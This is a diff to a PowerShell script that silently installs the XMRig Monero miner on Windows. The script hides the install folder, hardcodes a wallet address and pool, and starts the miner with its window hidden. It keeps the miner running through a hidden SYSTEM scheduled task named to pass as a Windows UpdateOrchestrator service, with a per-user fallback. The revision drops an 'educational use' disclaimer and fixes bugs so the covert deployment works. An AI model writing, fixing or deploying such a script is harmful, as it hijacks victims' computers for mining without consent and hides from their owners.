@@ -1,10 +1,9 @@
 # ================================================
-# XMRig Debug Deploy Script - FULL LOGGING VERSION
-# For educational/lab use only
-# Runs in one line, silent, persistent, 60% threads
+# XMRig DEBUG DEPLOYMENT v2 - FIXED VERSION
+# Full logging, works on Windows 10/11
 # ================================================
 
-$LogFile = "C:\Windows\Temp\xmr_deploy_debug.log"
+$LogFile = "C:\Windows\Temp\xmr_deploy_debug_v2.log"
 
 function Log {
     param([string]$Message)
@@ -13,25 +12,25 @@ function Log {
     Write-Host "$Timestamp | $Message" -ForegroundColor Cyan
 }
 
-Log "=== XMRig DEBUG DEPLOYMENT STARTED ==="
+Log "=== XMRig DEBUG v2 DEPLOYMENT STARTED ==="
 
-# 1. Create hidden install directory
+# 1. Hidden install directory
 $InstallDir = "C:\ProgramData\XMRUpdate"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
-    (Get-Item $InstallDir).Attributes = "Hidden"
+    (Get-Item $InstallDir).Attributes += "Hidden"
 }
-Log "Install directory created (hidden): $InstallDir"
+Log "Install directory: $InstallDir"
 
-# 2. Download latest XMRig (v6.25.0 - March 2026)
+# 2. Download XMRig 6.25.0
 $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
-$ZipPath = "$env:TEMP\xmrig-debug.zip"
+$ZipPath = "$env:TEMP\xmrig-v2.zip"
 
 try {
-    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 30
-    Log "Download completed successfully"
+    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
+    Log "Download completed"
 } catch {
-    Log "ERROR downloading: $($_.Exception.Message)"
+    Log "ERROR download: $($_.Exception.Message)"
     throw
 }
 
@@ -40,47 +39,45 @@ try {
     Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
     Log "Extraction completed"
 } catch {
-    Log "ERROR extracting: $($_.Exception.Message)"
+    Log "ERROR extract: $($_.Exception.Message)"
     throw
 }
 
-# 4. Clean zip and move files to root if inside subfolder
 Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
-$SubFolder = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "xmrig*" } | Select-Object -First 1
+
+# Move files if inside subfolder
+$SubFolder = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
 if ($SubFolder) {
     Move-Item "$($SubFolder.FullName)\*" $InstallDir -Force
     Remove-Item $SubFolder.FullName -Recurse -Force
-    Log "Files moved from subfolder to root"
+    Log "Files moved from subfolder"
 }
 
-# 5. Locate xmrig.exe
-$ExePath = Get-ChildItem -Path $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1 -ExpandProperty FullName
+# 4. Find xmrig.exe
+$ExePath = (Get-ChildItem -Path $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
 if (-not $ExePath) {
-    Log "ERROR: xmrig.exe not found after extraction!"
+    Log "ERROR: xmrig.exe not found!"
     throw "xmrig.exe missing"
 }
-Log "XMRig executable found: $ExePath"
+Log "XMRig found: $ExePath"
 
-# 6. Create config.json (60% threads, your wallet, supportxmr pool with TLS)
+# 5. Config.json (60% threads, your wallet, TLS pool)
 $Config = @{
     autosave       = $false
     background     = $false
     colors         = $false
-    cpu            = @{
-        enabled          = $true
-        "max-threads-hint" = 60
-    }
+    cpu            = @{ enabled = $true; "max-threads-hint" = 60 }
     "donate-level" = 0
     "log-file"     = $null
     pools          = @(
         @{
-            algo         = "rx/0"
-            url          = "pool.supportxmr.com:443"
-            user         = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
-            pass         = "x"
-            keepalive    = $true
-            tls          = $true
-            "rig-id"     = $env:COMPUTERNAME
+            algo      = "rx/0"
+            url       = "pool.supportxmr.com:443"
+            user      = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
+            pass      = "x"
+            keepalive = $true
+            tls       = $true
+            "rig-id"  = $env:COMPUTERNAME
         }
     )
     "print-time"   = 60
@@ -90,43 +87,47 @@ $Config = @{
 
 $ConfigPath = "$InstallDir\config.json"
 $Config | Out-File -FilePath $ConfigPath -Encoding UTF8 -Force
-Log "config.json created with 60% threads and your wallet"
+Log "config.json created (60% threads)"
 
-# 7. Start miner immediately (hidden)
+# 6. Start miner hidden (fixed)
 try {
-    Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden -NoNewWindow
-    Log "Miner started immediately in background"
+    Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden
+    Log "Miner started in background (WindowStyle Hidden)"
 } catch {
     Log "ERROR starting miner: $($_.Exception.Message)"
 }
 
-# 8. Create persistence (Scheduled Task)
+# 7. Persistence - Fixed Scheduled Task
 $TaskName = "Microsoft\Windows\UpdateOrchestrator\USOWorker"
 
 try {
-    # Try SYSTEM + AtStartup (requires admin)
     $Action    = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
     $Trigger   = New-ScheduledTaskTrigger -AtStartup
     $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    $Settings  = New-ScheduledTaskSettingsSet -Hidden $true -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+    
+    $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+    $Settings.Hidden = $true   # <-- Fixed way to set hidden
 
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
-    Log "SUCCESS: Persistence created as SYSTEM at startup"
+    Log "SUCCESS: SYSTEM task created with persistence at startup"
 } catch {
-    Log "SYSTEM task failed (no admin?): $($_.Exception.Message)"
-    Log "Trying fallback (current user + AtLogOn)..."
+    Log "SYSTEM task failed: $($_.Exception.Message)"
+    Log "Trying fallback (current user)..."
 
     # Fallback
     $Action    = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
     $Trigger   = New-ScheduledTaskTrigger -AtLogOn
     $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
-    $Settings  = New-ScheduledTaskSettingsSet -Hidden $true -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero)
+    
+    $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero)
+    $Settings.Hidden = $true
 
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
-    Log "Fallback persistence created (runs at user logon)"
+    Log "Fallback task created (AtLogOn)"
 }
 
-Log "=== XMRig DEBUG DEPLOYMENT FINISHED SUCCESSFULLY ==="
+Log "=== XMRig DEBUG v2 DEPLOYMENT FINISHED ==="
 Log "Log file: $LogFile"
-Log "Check running miner: tasklist | findstr xmrig"
-Log "Check task: schtasks /query /tn `"$TaskName`""
+Log "Check miner:   tasklist | findstr xmrig"
+Log "Check task:    schtasks /query /tn `"$TaskName`" /fo LIST /v"
+Log "Check config:  type `"$ConfigPath`""
